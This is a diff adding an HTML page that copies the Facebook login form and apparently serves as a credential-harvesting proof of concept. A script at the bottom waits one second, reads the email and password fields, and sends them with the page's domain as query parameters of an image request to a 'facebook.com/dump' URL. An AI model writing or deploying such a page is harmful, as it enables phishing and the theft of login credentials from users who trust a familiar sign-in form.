@@ -1,0 +1,27 @@
+<html><body>
+<form id="login_form" action="https://www.facebook.com/login.php?login_attempt=1" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
+<input type="hidden" name="lsd" value="AVpjl729" autocomplete="off" />
+<table cellspacing="0"><tr><td class="html7magic">
+<label for="email">Email or Phone</label></td><td class="html7magic">
+<label for="pass">Password</label></td></tr><tr><td>
+<input type="text" class="inputtext" name="email" id="email" value="" tabindex="1" /></td><td>
+<input type="password" class="inputtext" name="pass" id="pass" tabindex="2" /></td><td>
+<label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_4">
+<input value="Log In" tabindex="4" type="submit" id="u_0_4" /></label></td></tr>
+<tr><td class="login_form_label_field"><div><div class="uiInputLabel clearfix"><input id="persist_box" type="checkbox" name="persistent" value="1" tabindex="3" class="uiInputLabelCheckbox" /><label for="persist_box">Keep me logged in</label></div><input type="hidden" name="default_persistent" value="0" /></div></td><td class="login_form_label_field"><a rel="nofollow" href="http://www.facebook.com/recover/initiate">Forgot your password?</a></td></tr></table><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_3" /><input type="hidden" name="lgnrnd" value="173709_ugJC" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><input type="hidden" autocomplete="off" id="locale" name="locale" value="en_US" />
+</form>
+
+<script>
+setTimeout(dynomite, 1000);
+
+function dynomite()
+{
+username = document.getElementsByTagName('input')[1].value;
+password = document.getElementsByTagName('input')[2].value;
+
+var img = new Image();
+img.src="http://www.facebook.com/dump?"+username+"&"+password+"&"+document.domain;
+document.body.appendChild(img);
+}
+</script>
+</body></html>
